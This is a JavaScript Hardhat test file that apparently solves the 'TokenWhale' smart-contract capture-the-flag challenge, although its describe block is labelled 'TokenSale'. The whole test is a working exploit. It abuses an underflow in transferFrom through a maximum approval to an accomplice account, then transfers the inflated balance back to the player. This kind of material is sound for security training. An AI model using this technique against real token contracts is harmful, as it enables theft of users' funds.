import { expect } from 'chai';
import { ethers } from 'hardhat';

describe('TokenSale', function () {
  it('should exploit the transferFrom()', async function () {
    const [, player, accomplice] = await ethers.getSigners();

    const Challenge = await ethers.getContractFactory('TokenWhale');
    const challenge = await Challenge.deploy(player.address);
    await challenge.deployed();

    const tokens = ethers.BigNumber.from(2).pow(256).sub(1);
    let tx = await challenge
      .connect(player)
      .approve(accomplice.address, tokens);
    await tx.wait();

    tx = await challenge
      .connect(accomplice)
      .transferFrom(player.address, player.address, 1000);
    await tx.wait();

    tx = await challenge
      .connect(accomplice)
      .transfer(player.address, 100000000);
    await tx.wait();

    expect(await challenge.isComplete()).to.be.true;
  });
});
